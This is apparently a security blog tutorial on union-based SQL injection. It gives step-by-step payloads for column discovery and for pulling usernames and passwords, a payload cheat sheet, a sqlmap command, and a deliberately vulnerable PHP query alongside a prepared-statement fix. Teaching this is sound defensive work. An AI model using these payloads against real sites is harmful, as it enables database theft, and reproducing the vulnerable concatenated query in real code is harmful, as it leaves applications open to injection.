---
title: "SQL Injection — Union Based"
date: 2026-04-01T01:00:01+07:00
draft: false
author: "Andrew"
summary: "Union-Based SQL Injection is a technique where attackers use the SQL UNION keyword to append additional queries to the original statement, allowing them to extract data from other tables in the database."
tags: ["Web Penetration Testing", "SQL Injection", "Union Based"]
categories: ["Web Penetration Testing", "SQL Injection"]
description: ""
---

# SQL Injection — Union Based

## What Is SQLi Union-Based?

Among all SQL injection types, **Union-Based SQLi** is the "cleanest" one, meaning attackers can directly see the results of their injected query. This technique exploits the SQL `UNION` keyword to append a new query to the original statement, allowing attackers to extract data from other tables in the database.

Put simply: your web app has a query that returns data, and the attacker adds an extra query with `UNION` to steal data. The result? They can see everything in the database like usernames, passwords, credit cards, all of it.

---

## How It Works

**1. Identify Column Count**

Before using `UNION`, attackers need to know how many columns the original query returns. This is done with `ORDER BY`:

```
GET /products?id=1 ORDER BY 1--
GET /products?id=1 ORDER BY 2--
GET /products?id=1 ORDER BY 3--
-- Keep going until error occurs (column count found)
```

**2. Find Displayed Columns**

Attackers test each column with NULL values:

```
GET /products?id=-1 UNION SELECT NULL--
GET /products?id=-1 UNION SELECT NULL,NULL--
-- Keep going until it works — displayed columns are marked by visible values
```

**3. Extract Data**

Now that attackers know which columns are displayed, they can fill them with data from other tables:

```
GET /products?id=-1 UNION SELECT username,password FROM users--
```

**Attack Diagram:**

```
┌──────────────────────────────────────────────────────────────┐
│  APP QUERY:                                                  │
│  SELECT name, price FROM products WHERE id = 1              │
│                                                              │
│  ATTACKER INPUT:                                             │
│  id = -1 UNION SELECT username,password FROM users--         │
│                                                              │
│  RESULTING QUERY:                                            │
│  SELECT name, price FROM products WHERE id = -1             │
│  UNION                                                       │
│  SELECT username, password FROM users                       │
└──────────────────────────────────────────────────────────────┘
```

---

## Vulnerable Code Example

**PHP — Vulnerable:**

```php
$product_id = $_GET['id'];
$query = "SELECT name, description, price FROM products WHERE id = $product_id";
$result = mysqli_query($conn, $query);
```

**What the attacker sends:**

```
https://example.com/product?id=-1 UNION SELECT username,email,password FROM users--
```

**What happens:**

```sql
SELECT name, description, price FROM products WHERE id = -1
UNION
SELECT username, email, password FROM users
```

Every username, email, and password from the users table is right there in the response.

---

## Impact

| Severity | Impact |
|----------|--------|
| **Critical** | Total database compromise — any data can be pulled |
| **High** | Authentication bypass, privilege escalation |
| **Medium** | Data exposure (PII, financial records) |

---

## Mitigation

```php
// SECURE: Using Prepared Statements
$stmt = $conn->prepare("SELECT name, description, price FROM products WHERE id = ?");
$stmt->bind_param("i", $product_id);
$stmt->execute();
$result = $stmt->get_result();
```

**General principles:**
```
✅ Prepared Statements / Parameterized Queries
✅ Input validation (type must be integer for id)
✅ Least privilege — DB user only reads necessary tables
✅ WAF as an additional defense layer
✅ Regular code review
```

---

## Detection Tools

| Tool | Command |
|------|---------|
| sqlmap | `sqlmap -u "https://example.com/product?id=1" --union-cols 2-4` |
| Burp Suite | Use Repeater for manual testing |
| nuclei | Templates for SQLi detection |

**Manual testing:**
```
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT username,password FROM users--
```

---

## Cheat Sheet

| Testing | Payload | Expected |
|---------|---------|----------|
| Find columns | `ORDER BY N--` | Error when N > column count |
| Union exploit | `UNION SELECT col1,col2 FROM users--` | Data displayed |
| String extraction | `UNION SELECT CONCAT(username,0x3a,password),NULL FROM users--` | colon-separated values |
| Database version | `UNION SELECT @@version,NULL--` | Version info |
| List tables | `UNION SELECT table_name,NULL FROM information_schema.tables--` | Table names |

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

